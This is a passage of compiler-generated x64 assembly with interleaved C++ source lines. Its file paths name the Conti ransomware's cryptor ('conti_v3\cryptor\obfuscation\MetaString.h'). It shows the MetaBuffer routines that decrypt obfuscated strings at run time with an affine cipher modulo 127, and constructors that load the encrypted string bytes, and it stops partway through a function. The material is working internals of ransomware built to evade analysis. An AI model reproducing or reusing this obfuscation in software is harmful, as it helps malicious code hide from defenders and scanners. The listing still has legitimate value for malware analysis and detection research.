__int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 16 00 00
	00		 mov	 r10d, 22
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 49 00 00 00	 mov	 eax, 73			; 00000049H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 39	 mov	 BYTE PTR [rcx+1], 57	; 00000039H
  00007	c6 41 02 49	 mov	 BYTE PTR [rcx+2], 73	; 00000049H
  0000b	c6 41 03 29	 mov	 BYTE PTR [rcx+3], 41	; 00000029H
  0000f	c6 41 04 49	 mov	 BYTE PTR [rcx+4], 73	; 00000049H
  00013	c6 41 05 7c	 mov	 BYTE PTR [rcx+5], 124	; 0000007cH
  00017	c6 41 06 49	 mov	 BYTE PTR [rcx+6], 73	; 00000049H
  0001b	c6 41 07 1e	 mov	 BYTE PTR [rcx+7], 30
  0001f	c6 41 08 49	 mov	 BYTE PTR [rcx+8], 73	; 00000049H
  00023	c6 41 09 02	 mov	 BYTE PTR [rcx+9], 2
  00027	c6 41 0a 49	 mov	 BYTE PTR [rcx+10], 73	; 00000049H
  0002b	c6 41 0b 29	 mov	 BYTE PTR [rcx+11], 41	; 00000029H
  0002f	c6 41 0c 49	 mov	 BYTE PTR [rcx+12], 73	; 00000049H
  00033	c6 41 0d 47	 mov	 BYTE PTR [rcx+13], 71	; 00000047H
  00037	c6 41 0e 49	 mov	 BYTE PTR [rcx+14], 73	; 00000049H
  0003b	c6 41 0f 4f	 mov	 BYTE PTR [rcx+15], 79	; 0000004fH
  0003f	c6 41 10 49	 mov	 BYTE PTR [rcx+16], 73	; 00000049H
  00043	c6 41 11 7b	 mov	 BYTE PTR [rcx+17], 123	; 0000007bH
  00047	c6 41 12 49	 mov	 BYTE PTR [rcx+18], 73	; 00000049H
  0004b	c6 41 13 4f	 mov	 BYTE PTR [rcx+19], 79	; 0000004fH
  0004f	c6 41 14 49	 mov	 BYTE PTR [rcx+20], 73	; 00000049H
  00053	c6 41 15 49	 mov	 BYTE PTR [rcx+21], 73	; 00000049H
  00057	c6 41 16 49	 mov	 BYTE PTR [rcx+22], 73	; 00000049H
  0005b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0005f	48 8b c1	 mov	 rax, rcx
  00062	c3		 ret	 0
??0?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 5c 00 00 00	 mov	 eax, 92			; 0000005cH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 67	 mov	 BYTE PTR [rcx+1], 103	; 00000067H
  00007	c6 41 02 5c	 mov	 BYTE PTR [rcx+2], 92	; 0000005cH
  0000b	c6 41 03 05	 mov	 BYTE PTR [rcx+3], 5
  0000f	c6 41 04 5c	 mov	 BYTE PTR [rcx+4], 92	; 0000005cH
  00013	c6 41 05 02	 mov	 BYTE PTR [rcx+5], 2
  00017	c6 41 06 5c	 mov	 BYTE PTR [rcx+6], 92	; 0000005cH
  0001b	c6 41 07 3b	 mov	 BYTE PTR [rcx+7], 59	; 0000003bH
  0001f	c6 41 08 5c	 mov	 BYTE PTR [rcx+8], 92	; 0000005cH
  00023	c6 41 09 5c	 mov	 BYTE PTR [rcx+9], 92	; 0000005cH
  00027	c6 41 0a 5c	 mov	 BYTE PTR [rcx+10], 92	; 0000005cH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 1c 00 00
	00		 mov	 r10d, 28
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 37 00 00 00	 mov	 eax, 55			; 00000037H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 0b	 imul	 ecx, eax, 11

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 48	 mov	 BYTE PTR [rcx+1], 72	; 00000048H
  00007	c6 41 02 37	 mov	 BYTE PTR [rcx+2], 55	; 00000037H
  0000b	c6 41 03 5e	 mov	 BYTE PTR [rcx+3], 94	; 0000005eH
  0000f	c6 41 04 37	 mov	 BYTE PTR [rcx+4], 55	; 00000037H
  00013	c6 41 05 47	 mov	 BYTE PTR [rcx+5], 71	; 00000047H
  00017	c6 41 06 37	 mov	 BYTE PTR [rcx+6], 55	; 00000037H
  0001b	c6 41 07 52	 mov	 BYTE PTR [rcx+7], 82	; 00000052H
  0001f	c6 41 08 37	 mov	 BYTE PTR [rcx+8], 55	; 00000037H
  00023	c6 41 09 53	 mov	 BYTE PTR [rcx+9], 83	; 00000053H
  00027	c6 41 0a 37	 mov	 BYTE PTR [rcx+10], 55	; 00000037H
  0002b	c6 41 0b 51	 mov	 BYTE PTR [rcx+11], 81	; 00000051H
  0002f	c6 41 0c 37	 mov	 BYTE PTR [rcx+12], 55	; 00000037H
  00033	c6 41 0d 19	 mov	 BYTE PTR [rcx+13], 25
  00037	c6 41 0e 37	 mov	 BYTE PTR [rcx+14], 55	; 00000037H
  0003b	c6 41 0f 5e	 mov	 BYTE PTR [rcx+15], 94	; 0000005eH
  0003f	c6 41 10 37	 mov	 BYTE PTR [rcx+16], 55	; 00000037H
  00043	c6 41 11 25	 mov	 BYTE PTR [rcx+17], 37	; 00000025H
  00047	c6 41 12 37	 mov	 BYTE PTR [rcx+18], 55	; 00000037H
  0004b	c6 41 13 61	 mov	 BYTE PTR [rcx+19], 97	; 00000061H
  0004f	c6 41 14 37	 mov	 BYTE PTR [rcx+20], 55	; 00000037H
  00053	c6 41 15 38	 mov	 BYTE PTR [rcx+21], 56	; 00000038H
  00057	c6 41 16 37	 mov	 BYTE PTR [rcx+22], 55	; 00000037H
  0005b	c6 41 17 15	 mov	 BYTE PTR [rcx+23], 21
  0005f	c6 41 18 37	 mov	 BYTE PTR [rcx+24], 55	; 00000037H
  00063	c6 41 19 38	 mov	 BYTE PTR [rcx+25], 56	; 00000038H
  00067	c6 41 1a 37	 mov	 BYTE PTR [rcx+26], 55	; 00000037H
  0006b	c6 41 1b 37	 mov	 BYTE PTR [rcx+27], 55	; 00000037H
  0006f	c6 41 1c 37	 mov	 BYTE PTR [rcx+28], 55	; 00000037H
  00073	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00077	48 8b c1	 mov	 rax, rcx
  0007a	c3		 ret	 0
??0?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 16 00 00
	00		 mov	 r10d, 22
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 2e 00 00 00	 mov	 eax, 46			; 0000002eH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2c	 imul	 ecx, eax, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
